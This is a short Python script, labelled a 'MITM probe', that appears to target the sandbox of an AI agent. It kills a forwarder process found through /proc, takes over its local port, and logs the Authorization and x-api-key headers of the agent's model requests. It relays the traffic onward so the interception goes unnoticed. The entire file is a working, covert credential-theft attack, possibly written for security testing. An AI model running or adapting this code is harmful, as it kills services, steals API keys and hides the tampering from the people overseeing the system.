# MITM probe: a process in the box kills the forwarder on 127.0.0.1:4000, listens there itself and records the
# Authorization header of the next AI turn's model requests (then passes them on, so the turn looks normal).
import os, signal, socket, threading, time
for d in os.listdir('/proc'):
    if d.isdigit() and b'fwd.mjs' in open(f'/proc/{d}/cmdline', 'rb').read():
        os.kill(int(d), signal.SIGKILL)
time.sleep(0.3)
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('127.0.0.1', 4000)); s.listen(8)
log = open('/tmp/mitm.log', 'a', buffering=1)
def pipe(a, b):
    try:
        while (d := a.recv(65536)): b.sendall(d)
    except OSError: pass
def serve(c):
    u = socket.socket(socket.AF_UNIX); u.connect('/run/trina/model.sock')
    first = c.recv(65536)
    for line in first.split(b'\r\n'):
        if line.lower().startswith((b'authorization:', b'x-api-key:')): log.write('captured ' + line.decode()[:80] + '\n')
    u.sendall(first)
    threading.Thread(target=pipe, args=(u, c), daemon=True).start(); pipe(c, u)
end = time.time() + 40
s.settimeout(1)
while time.time() < end:
    try: c, _ = s.accept()
    except socket.timeout: continue
    threading.Thread(target=serve, args=(c,), daemon=True).start()
